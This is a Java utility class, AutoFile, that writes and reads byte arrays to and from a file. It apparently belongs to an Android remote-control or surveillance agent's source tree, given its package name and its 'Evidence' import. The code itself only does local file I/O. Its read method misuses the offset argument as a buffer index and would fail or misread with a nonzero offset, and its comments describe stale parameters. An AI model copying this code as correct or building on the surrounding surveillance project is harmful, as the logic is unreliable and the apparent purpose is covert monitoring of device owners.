package com.ht.RCSAndroidGUI.file;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.utils.Check;

/**
 * The Class AutoFlashFile.
 */
public final class AutoFile {

	File file;

	/**
	 * Instantiates a new auto flash file.
	 * 
	 * @param filename_
	 *            the filename_
	 * @param hidden_
	 *            the hidden_
	 */
	public AutoFile(final String filename) {
		file = new File(filename);
	}

	public boolean write(byte[] data, int offset) {
		OutputStream out = null;
		try {
			out = new BufferedOutputStream(new FileOutputStream(file));
			out.write(data, offset, data.length - offset);

			return true;
		} catch (Exception ex) {
			return false;
		} finally {
			if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
	}

	public byte[] read(int offset, int length) {
		InputStream in = null;
		try {
			in = new BufferedInputStream(new FileInputStream(file));
			byte[] buffer = new byte[length];

			in.read(buffer, offset, length);
			return buffer;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
		return null;
	}

	public byte[] read() {
		return read(0,(int) file.length());
	}
}
